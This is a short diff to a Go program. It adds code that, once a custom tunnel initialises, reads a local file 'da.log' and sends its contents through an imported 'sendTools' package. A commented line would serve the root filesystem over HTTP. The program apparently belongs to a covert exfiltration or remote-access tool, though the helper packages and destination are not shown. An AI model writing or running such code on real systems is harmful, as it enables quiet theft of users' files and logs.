@@ -1,12 +1,11 @@
-
-
 package main
-import(
+
+import (
 	"fmt"
+	"os"
 	//"net/http"
-	//"windows/sendTools"
+	"windows/sendTools"
 	"windows/tunnel"
-	
 )
 
 
@@ -16,6 +15,15 @@ func main(){
 	
 	re := tunnel.InitTunne()
 	fmt.Println(re)
+	if(re){
+		data, err := os.ReadFile("da.log")
+		if(err != nil){
+			sendTools.Send("error")
+		}else{
+			sendTools.Send(string(data))
+		}
+		
+	}
 
 	//fmt.Println(tunnel.Command("linux", "hel"))
 	// resp := http.FileServer(http.Dir("/"))
